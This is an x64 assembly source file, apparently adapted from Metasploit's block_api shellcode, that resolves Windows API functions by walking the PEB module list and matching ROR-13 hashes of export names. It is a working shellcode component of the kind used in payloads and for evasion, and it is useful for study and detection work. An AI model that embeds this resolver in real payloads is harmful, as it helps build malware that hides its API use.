; Inputs:
;   - r10d (The hash of the module!function to call)
;   - rcx/rdx/r8/r9/any stack params for the function
;
; Resources:
;   - https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm
api_call:
    ; Save API params.
    push r9                     ; Save the 4th parameter
    push r8                     ; Save the 3rd parameter
    push rdx                    ; Save the 2nd parameter
    push rcx                    ; Save the 1st parameter
    ;
    push rsi                    ; Save RSI
    ; Get pointer address of the module list
    xor rdx, rdx
    mov rdx, gs:[rdx+0x60]      ; PEB
    mov rdx, [rdx+0x18]         ; PEB->Ldr
    mov rdx, [rdx+0x20]         ; PEB->Ldr->InMemoryOrderModuleList
; Get module name buffer and length
get_mod:
    mov rsi, [rdx+0x50]         ; (PLDR_DATA_TABLE_ENTRY)Entry->FullDllName->Buffer
    movzx rcx, word [rdx+0x4a]  ; (PLDR_DATA_TABLE_ENTRY)Entry->FullDllName->MaximumLength
    xor r9, r9                  ; Clear r9 which will store the hash of the module name
loop_modname:
    xor rax, rax
    lodsb                       ; Load 1 byte of the module name buffer (RSI) to AL, and increment RSI for the next byte.
    cmp al, 'a'                 ; Some version of Windows use lowercase module names
    jl not_lowercase            ; If uppercase, go to the not_lowercase
    sub al, 0x20                ; If lowercase, convert to uppercase before going to the not_lowercase
not_lowercase:
    ; Calculate the hash from the module name (see: scripts/hash.py)
    ror r9d, 0xd                ; Rotate right our hash value
    add r9d, eax                ; r9d = r9d + eax (al). EAX is used instead of AL because of the data size.
    loop loop_modname           ; Loop until the module name is computed.
    ; Save the current states.
    push rdx                    ; Save the current entry (InMemoryOrderModueList) for later
    push r9                     ; Save the current module hash for later
    ; Proceed to iterate the Export Address Table
    mov rdx, [rdx+0x20]         ; DosHeader = (PLDR_DATA_TABLE_ENTRY)Entry->DllBase(IMAGE_DOS_HEADER)
    mov eax, dword [rdx+0x3c]   ; NtHeadersRVA = (PIMAGE_DOS_HEADER)DllBase->e_lfanew
    add rax, rdx                ; NtHeaders = DosHeader + NtHeadersRVA
    ;
    cmp word [rax+0x18], 0x020b ; Check if this PE is 64-bit by comparing the NtHeaders->OptionalHeader and 0x020b
    jne get_next_mod1           ; If not, proceed to the next module.
    ;
    mov eax, dword [rax+0x88]   ; NtHeaders->OptionalHeader->DataDirectory
    ;
    test rax, rax               ; Test if no export address table is present
    jz get_next_mod1            ; If no EAT present, process the next module
    ;
    add rax, rdx                ; (PIMAGE_EXPORT_DIRECTORY)ExportDir = DllBase + NtHeaders->OptionalHeader->DataDirectory
    push rax                    ; Save the current modules EAT
    mov ecx, dword [rax+0x18]   ; ExportDir->NumberOfNames
    mov r8d, dword [rax+0x20]   ; ExportDir->AddressOfFunctions
    add r8, rdx                 ; DllBase + ExportDir->AddressOfFunctions
; Get function name in the module
get_next_func:
    jrcxz get_next_mod          ; When we reach the start of the EAT (we search backwards), process the next module
    dec rcx                     ; Decrement the function name counter
    mov esi, dword [r8+rcx*0x4] ; Get RVA of next module name
    add rsi, rdx                ; Add the modules base address
    xor r9, r9                  ; Clear r9 which will store the hash of the function name
; Compute the hash of module!function
loop_funcname:
    ; Calculate the hash from the function name (see: scripts/hash.py)
    xor rax, rax
    lodsb                       ; Load 1 byte of the function name (RSI) to AL.
    ror r9d, 0xd                ; Rotate right our hash value
    add r9d, eax                ; Add the next byte of the name
    ; Check if the current byte is null-terminator
    cmp al, ah                  ; Compare AL to AH (null)
    jne loop_funcname           ; If we have not reached the null terminator, continue
    ; Compare hashes to detect target module!function.
    add r9, [rsp+0x8]           ; Add the current module hash to the function hash
    cmp r9d, r10d               ; Compare the current hash with the desired hash (r10d)
    jnz get_next_func           ; If not match, go to the next function.
    ; If match, fix up stack, call the function and then value else compute the next one...
    pop rax                     ; Restore the current modules EAT
    mov r8d, dword [rax+0x24]   ; (IMAGE_EXPORT_DIRECTORY)DataDirectory->AddressOfNameOrdinals
    add r8, rdx                 ; DllBase + AddressOfNameOrdinals
    mov cx, [r8+0x2*rcx]        ; Get the desired function ordinal with the function counter (RCX).
    mov r8d, dword [rax+0x1c]   ; (IMAGE_EXPORT_DIRECTORY)DataDirectory->AddressOfFunctions
    add r8, rdx                 ; DllBase + AddressOfFunctions
    mov eax, dword [r8+0x4*rcx] ; AddressOfFunctionsRVA[AddressOfNameOrdinalsRVA[rcx]]
    add rax, rdx                ; Add the modules base address to get the function actual VA
; We now fix up the stack and perform the call to the desired function
finish:
    pop r8                      ; Clear off the current modules hash
    pop r8                      ; Clear off the current position in the module list
    pop rsi                     ; Restore RSI
    pop rcx                     ; Restore the 1st parameter
    pop rdx                     ; Restore the 2nd parameter
    pop r8                      ; Restore the 3rd parameter
    pop r9                      ; Restore the 4th parameter
    pop r10                     ; Pop off the return address
    sub rsp, 0x20               ; Reserve space for the four register params (4 * sizeof(QWORD) = 0x20)
    push r10                    ; Push back the return address
    jmp rax                     ; Jump into the required function
; We now automatically return to the correct caller
get_next_mod:
    pop rax                     ; Pop off the next module's EAT (RAX)
get_next_mod1:
    pop r9                      ; Restore the current module hash
    pop rdx                     ; Restore our position in the module list
    mov rdx, [rdx]              ; Get the next module
    jmp get_mod                 ; Process this module
